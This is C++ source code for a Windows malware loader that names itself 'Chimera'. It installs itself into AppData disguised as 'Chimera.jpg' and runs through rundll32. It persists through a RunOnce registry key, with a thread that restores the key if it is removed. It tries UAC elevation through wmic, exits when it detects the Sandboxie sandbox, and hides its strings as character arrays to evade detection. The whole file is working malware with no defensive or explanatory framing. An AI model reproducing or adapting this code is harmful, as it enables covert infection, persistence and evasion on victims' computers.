#include "global.h"

struct Data
{
	WCHAR szSelf[256];
	WCHAR szTemporary1[256];
	WCHAR szTemporary2[256];
};


BOOL Install()
{
	GlobalMemory MyMem(sizeof(Data) + 1);
	Data *lpData = (Data*)MyMem.localloc(sizeof(Data));
	if (!lpData)
	{
		dbg("No memory");
		return FALSE;
	}
	GetModuleFileNameW(0, lpData->szSelf, 256);


	HRESULT hRes = SHGetFolderPathW(0, CSIDL_APPDATA | CSIDL_FLAG_CREATE, NULL, SHGFP_TYPE_CURRENT, lpData->szTemporary1);
	if (hRes != S_OK)
		GetTempPathW(256, lpData->szTemporary1);


	WCHAR szRandomString[RandomDirectoryLen + 1] = { L'P', L'a', L'i', L'm', L'o', L'n', L'\0' };

	if (!GenerateRandomString(szRandomString, RandomDirectoryLen))
		dbg("Can not gen random string, using default Paimon");
	wsprintfW(lpData->szTemporary2, L"%s\\%s", lpData->szTemporary1, szRandomString);

	CreateDirectoryW(lpData->szTemporary2, 0);
	if (GetLastError() == ERROR_ACCESS_DENIED)
	{
		dbg("Error: access denied");
		return FALSE;
	}
	else
	{
		dbg(L"Created directory ", lpData->szTemporary2);
	}

	WCHAR szFileName[] = { L'C', L'h', L'i', L'm', L'e', L'r', L'a', L'.', L'j', L'p', L'g', L'\0' };

	wsprintfW(lpData->szTemporary1, L"%s\\%s", lpData->szTemporary2, szFileName);

	if (BlockCopy(lpData->szSelf, lpData->szTemporary1)) 
	{
		dbg(L"Wrote self to: ", lpData->szTemporary1);
		if (!CreateDllProcess(lpData->szTemporary1)) 
		{
			dbg("Can not create rundll process, loading self");
			HMODULE hSelfModule = LoadLibraryW(lpData->szTemporary1);

			if (hSelfModule)
			{
				typedef DWORD(_cdecl *lpCHIMERA)();
				lpCHIMERA fnFuncKROBA = (lpCHIMERA)GetProcAddress(hSelfModule, "CHIMERA");
				if (fnFuncKROBA)
				{
					fnFuncKROBA();
				}
			}

			Sleep(INFINITE);
		}
	}
	else
	{
		dbg(L"Can not copy self to: ", lpData->szTemporary1);
	}

	return TRUE;
}

BOOL SetupPersistence(LPWSTR pKeyName, BOOL isHKLM, LPWSTR pSelf);


BOOL HKAutorun(LPWSTR pSelf) 
{
	HKEY hKey;

	BOOL bRet = FALSE;

	WCHAR RegPath[] =
	{
		L'S', L'O', L'F', L'T', L'W', L'A',
		L'R', L'E', L'\\', L'M', L'i', L'c',
		L'r', L'o', L's', L'o', L'f', L't',
		L'\\', L'W', L'i', L'n', L'd', L'o',
		L'w', L's', L'\\', L'C', L'u', L'r',
		L'r', L'e', L'n', L't', L'V', L'e',
		L'r', L's', L'i', L'o', L'n', L'\\',
		L'R', L'u', L'n', L'O', L'n', L'c', L'e', L'\0'
	};

	GlobalMemory MyMem(1025);
	LPWSTR pRunCommandLine = (LPWSTR)MyMem.localloc(1024);

	BOOL bHKLM = TRUE;

	WCHAR wsprintfString[] =
	{
		L'r', L'u', L'n', L'd', L'l', L'l', L'3', L'2', L'.', L'e', L'x', L'e', L' ', L'\"', L'%', L's', L'\"', L',', L'K', L'R', L'O', L'B', L'A', L'\0'
	};

	wsprintfW(pRunCommandLine, wsprintfString, pSelf);

	dbg(L"Adding to registry: ", pSelf);

	DWORD ret = RegCreateKeyExW(HKEY_LOCAL_MACHINE, RegPath, 0, 0, 0, KEY_ALL_ACCESS, 0, &hKey, 0);

	if (ret != ERROR_SUCCESS)
	{
		dbg(L"HKLM error, adding to HKCU");
		DWORD ret = RegCreateKeyExW(HKEY_CURRENT_USER, RegPath, 0, 0, 0, KEY_ALL_ACCESS, 0, &hKey, 0);
		bHKLM = FALSE;
	}
	else
	{
		dbg(L"Adding to HKLM");
	}

	if (ret == ERROR_SUCCESS)
	{

		WCHAR szRandomString[RandomDirectoryLen + 1] = { L'P', L'a', L'i', L'm', L'o', L'n', L'\0' };

		if (!GenerateRandomString(szRandomString, RandomDirectoryLen))
			dbg("Can not gen random string, using default SuperBear");

		ret = RegSetValueExW(hKey, szRandomString, 0, REG_SZ, (LPBYTE)pRunCommandLine, lstrlenW(pRunCommandLine) * 2);
		if (ret != ERROR_SUCCESS)
		{
			dbg("Error setting value");
		}
		else
		{
			bRet = TRUE;

			SetupPersistence(szRandomString, bHKLM, pSelf); // âðóáèòü ïåðñèñòåíñ, ñì. îïèñàíèå îêîëî ñàìîé ôóíêöèè

		}
		RegCloseKey(hKey);
	}
	else
	{
		dbg("Error adding to registry");
	}
	return bRet;
}

struct PersistenceInformation
{
	WCHAR pKeyName[256]; 
	WCHAR pSelf[256];
	BOOL bHKLM; 
};

DWORD WINAPI ProtectRegistry(PersistenceInformation *lpPersistence)
{
#ifdef _DEBUG
	if (lpPersistence->bHKLM)
		dbg(L"[Persistence] protecting keyname in HKLM: ", lpPersistence->pKeyName);
	else
		dbg(L"[Persistence] pretecting keyname in HKCU: ", lpPersistence->pKeyName);
#endif


	HKEY hKey;


	WCHAR RegPath[] =
	{
		L'S', L'O', L'F', L'T', L'W', L'A',
		L'R', L'E', L'\\', L'M', L'i', L'c',
		L'r', L'o', L's', L'o', L'f', L't',
		L'\\', L'W', L'i', L'n', L'd', L'o',
		L'w', L's', L'\\', L'C', L'u', L'r',
		L'r', L'e', L'n', L't', L'V', L'e',
		L'r', L's', L'i', L'o', L'n', L'\\',
		L'R', L'u', L'n', L'O', L'n', L'c', L'e', L'\0'
	};

	DWORD ret;
	if (lpPersistence->bHKLM)
		ret = RegCreateKeyExW(HKEY_LOCAL_MACHINE, RegPath, 0, 0, 0, KEY_ALL_ACCESS, 0, &hKey, 0);
	else
		ret = RegCreateKeyExW(HKEY_CURRENT_USER, RegPath, 0, 0, 0, KEY_ALL_ACCESS, 0, &hKey, 0);

	if (ret == ERROR_SUCCESS)
	{
		if (RegNotifyChangeKeyValue(hKey, TRUE, REG_NOTIFY_CHANGE_LAST_SET, 0, FALSE) == ERROR_SUCCESS)
		{
			if (HKAutorun(lpPersistence->pSelf))
				dbg("[Persistence] restored");
			else
				dbg("[Persistence] can not restore value");
		}
		RegCloseKey(hKey);
	}
	else
	{
		dbg("[Persistence] Reg create error");
	}
	ExitThread(0);
}

BOOL SetupPersistence(LPWSTR pKeyName, BOOL isHKLM, LPWSTR pSelf)
{
	PersistenceInformation *lpPersistence = (PersistenceInformation*)VirtualAlloc(0, sizeof(PersistenceInformation), MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);

	if (lpPersistence)
	{
		lstrcpyW(lpPersistence->pKeyName, pKeyName);
		lstrcpyW(lpPersistence->pSelf, pSelf);
		lpPersistence->bHKLM = isHKLM;
		HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ProtectRegistry, (LPVOID)lpPersistence, 0, 0);
		if (!hThread)
			dbg("Can not create thread to protect registry");
	}
	
	return FALSE;
}


BOOL HostProcessSvchost() 
{
	return FALSE;
}

BOOL SvchostAutorun() 
{   
	return FALSE;
}

VOID AddStartup(LPWSTR pSelf)
{
	
	
	if (HostProcessSvchost()) 
		return;

	if (!SvchostAutorun())
	{
		dbg("Error adding self to svchost");
		if (!HKAutorun(pSelf))
		{
			dbg("Error adding self to HKCU");
		}
		else
		{
			dbg("Succeeded run in runonce");
		}
	}
}

DWORD WINAPI LdrMain(PWCHAR pSelf)
{
	AddStartup(pSelf);

	CreateMutexW(0, 0, L"CHIMERA-LDRA-VITMA-YAWA");
	DWORD dwLastErr = GetLastError();

	if ((dwLastErr == ERROR_ACCESS_DENIED) || (dwLastErr == ERROR_ALREADY_EXISTS))
	{
		dbg("Already running");
		ExitProcess(0);
	}

#ifdef _DEBUG
	MessageBoxW(0, L"LdrMain", L"LdrMain", 0);
#endif

	ControlMain();

	ExitThread(0);
}


BOOL IsUserElevatedAdmin()
{
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID SecurityIdentifier;
	if (!AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &SecurityIdentifier))
		return 0;

	BOOL IsAdminMember;

	HMODULE ntdll = GetModuleHandleA("advapi32.dll");
	typedef BOOL(__stdcall *ttCheckTokenMembership1)(HANDLE, PSID, PBOOL);
	ttCheckTokenMembership1 CheckTokenMembership1 = (ttCheckTokenMembership1)GetProcAddress(ntdll, "CheckTokenMembership");

	if (!CheckTokenMembership1(NULL, SecurityIdentifier, &IsAdminMember))
		IsAdminMember = FALSE;

	FreeSid(SecurityIdentifier);

	return IsAdminMember;
}
DWORD getBuildNumber() 
{
	DWORD dwVersion = 0;
	DWORD dwBuild = 0;
	dwVersion = GetVersion();

	if (dwVersion < 0x80000000)
		dwBuild = (DWORD)(HIWORD(dwVersion));
	return dwBuild;
}
void LowExit(LPWSTR lpSelf)
{
	if (!IsUserElevatedAdmin() && getBuildNumber() > 5112)
	{
		WCHAR szCommand[512];
		WCHAR szWMICPath[256];

		dbg("Elevating uac");
		
		WCHAR EnvirString[] = 
		{
			L'%', L'w', L'i', L'n', L'd', L'i', L'r',
			L'%', L'\\', L's', L'y', L's', L't', L'e',
			L'm', L'3', L'2', L'\\', L'w', L'b', L'e',
			L'm', L'\\', L'w', L'm', L'i', L'c', L'\0',
		};
		ExpandEnvironmentStringsW(EnvirString, szWMICPath, 255);
		
		dbg(L"WMI path: ", szWMICPath);

		WCHAR lpCommandLineString[] =
		{
			L'p', L'r', L'o', L'c', L'e', L's',
			L's', L' ', L'c', L'a', L'l', L'l',
			L' ', L'c', L'r', L'e', L'a', L't',
			L'e', L' ', L'\"', L'c', L'm', L'd',
			L' ', L'/', L'c', L' ', L's', L't',
			L'a', L'r', L't', L' ', L'%', L's',
			L'\"', L'\0'
		};
		wsprintfW(szCommand, lpCommandLineString, lpSelf);

		dbg(L"WMI Query: ", szCommand);

		GlobalMemory MyMem(sizeof(SHELLEXECUTEINFO)+1);
		LPSHELLEXECUTEINFO shExInfo = (LPSHELLEXECUTEINFO)MyMem.localloc(sizeof(SHELLEXECUTEINFO));

		if (!shExInfo)
		{
			dbg("Error: no memory in uac elevation");
		}

		
		shExInfo->cbSize = sizeof(SHELLEXECUTEINFO);
		shExInfo->fMask = SEE_MASK_NOCLOSEPROCESS;
		shExInfo->hwnd = 0;
		WCHAR RunAsStr[] =
		{
			L'r', L'u', L'n', L'a', L's', L'\0'
		};
		shExInfo->lpVerb = (LPCSTR)RunAsStr;
		shExInfo->lpFile = (LPCSTR)szWMICPath;
		shExInfo->lpParameters = (LPCSTR)szCommand;
		shExInfo->lpDirectory = 0;
		shExInfo->nShow = SW_HIDE;
		shExInfo->hInstApp = 0;
		
		DWORD ElevationTries = 0;
		do
		{
			if (ShellExecuteEx(shExInfo))
			{
				WaitForSingleObject(shExInfo->hProcess, INFINITE);
				dbg("WMI, elevation succeed");
				CloseHandle(shExInfo->hProcess);
				ExitProcess(0);
			}
			else
			{
				dbg("Elevation failed");
			}
			ElevationTries++;
		} while (ElevationTries < MAX_ELEVATE_TRIES);
	} 
	else
	{
		dbg("UAC elevation is not required");
	}
}

typedef DWORD(WINAPI *fnGetModuleFileNameW)(HMODULE, PWCHAR, DWORD);

VOID GetFuncModuleFileName(fnGetModuleFileNameW *lpFunc)
{
	CHAR KernelLib[] =
	{
		'K', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0'
	};

	CHAR szGetModuleFileNameW[] =
	{
		'G', 'e', 't', 'M', 'o', 'd',
		'u', 'l', 'e', 'F', 'i', 'l',
		'e', 'N', 'a', 'm', 'e', 'W',
		'\0'
	};

	*lpFunc = (fnGetModuleFileNameW)GetProcAddress(GetModuleHandleA(KernelLib), szGetModuleFileNameW);
}

extern "C"  __declspec(dllexport)
DWORD _cdecl CHIMERA()
{
	GlobalMemory MyMem(1024);
	LPWSTR pSelf = (LPWSTR)MyMem.localloc(513);
	HMODULE SelfModule;

	GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCSTR)&CHIMERA, &SelfModule);

	fnGetModuleFileNameW lpGetModuleFileNameW;

	GetFuncModuleFileName(&lpGetModuleFileNameW);

	if (lpGetModuleFileNameW)
	{
		lpGetModuleFileNameW(SelfModule, pSelf, 256);
	}
	

	LdrMain(pSelf);
	return 0;
}

VOID antiAnalysis()
{
	WCHAR SandboxieDLL[] =
	{
		L'S', L'b', L'i', L'e',
		L'D', L'l', L'l', L'.',
		L'd', L'l', L'l', L'\0',
	};

	if (GetModuleHandleW(SandboxieDLL))
	{
		MessageBoxW(0, L"Error: this is not document either it is corrupted. Try to run out of Sandboxie", L"Sandboxie error", MB_ICONERROR);
		ExitProcess(0);
	}
}

DWORD _cdecl DLLMain(HINSTANCE hInstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	GetCommandLineA();


	GlobalMemory MyMem(1024);
	LPWSTR pSelf = (LPWSTR)MyMem.localloc(513);
	HMODULE SelfModule;

	GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCSTR)&DLLMain, &SelfModule);

	
	fnGetModuleFileNameW lpGetModuleFileNameW;

	GetFuncModuleFileName(&lpGetModuleFileNameW);

	if (lpGetModuleFileNameW)
	{
		lpGetModuleFileNameW(SelfModule, pSelf, 256);
	}
	

	antiAnalysis();

	if (IsLibrary(SelfModule))
	{
		switch (fdwReason)
		{
		case DLL_PROCESS_ATTACH:


			dbg(L"Loaded as dll ", pSelf);
			LdrMain(pSelf);
			break;
		case DLL_PROCESS_DETACH:
			dbg(L"Detached from process ", pSelf);
			break;
		}
		return TRUE;
	}
	else
	{

		dbg(L"Started as exe file ", pSelf);
		
		LowExit(pSelf);

		if (!Install()) 
			dbg(L"Installation failed");

		ExitProcess(0);
	}
}
